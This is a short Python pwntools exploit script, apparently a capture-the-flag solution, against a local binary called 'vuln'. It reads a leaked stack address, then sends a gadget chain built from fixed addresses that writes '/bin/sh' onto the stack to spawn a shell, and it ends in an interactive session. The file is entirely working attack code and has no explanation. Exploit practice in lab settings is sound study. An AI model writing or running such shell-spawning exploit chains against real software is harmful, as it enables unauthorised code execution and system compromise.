#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('vuln')
context.update(
    log_level='debug'
)

sla = lambda x, y: p.sendlineafter(x, y)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
s = lambda x: p.send(x)
rcall = lambda x: p.recvall(x)
rcud = lambda x: p.recvuntil(x, drop=True)
rcu = lambda x: p.recvuntil(x)
rcl = lambda: p.recvline(0)
rcn = lambda x: p.recv(x)
logi = lambda x, y: log.info(f'{x} = {hex(y)}')
def bleak(x): ret = unpack(x, 'all'); logi('leak', ret); return ret
def hleak(x): ret = eval(x); logi('leak', ret); return ret

def start():
    global libc
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug([elf.path], c)
    else:
        return process(['./vuln'])

c = '''
b* 0x40106e
c
'''

REMOTE = 'nc localhost 31337'.replace('nc ', '').split(' ')
HOST = REMOTE[0] if REMOTE else ''
PORT = int(REMOTE[1]) if len(REMOTE) > 1 else 0

p = start()

stack = bleak(rcn(8))

popper = 0x0000000000401000
dispatcher = 0x401009
xchg_rdi_rsi = 0x401038
sub_rax_rcx = 0x40103c
add_rcx_rsp18 = 0x40102b
xor_rdx = 0x401020

pl = flat(
    b'\x00\x00\x00', # rdi
    stack - 112 + 8 * 4 + 69, # rdx
    stack - 112 + 8 * 4 + 0x25, #rsi
    8, #rcx
    dispatcher,
    xchg_rdi_rsi,
    add_rcx_rsp18,
    0x28,
    b'a' * 5,
    b'/bin/sh\x00',
    b'b' * 3,
    dispatcher,
    sub_rax_rcx,
    xor_rdx,
    popper, # rbx
    stack - 112, # rsp
)
sl(pl)

p.interactive()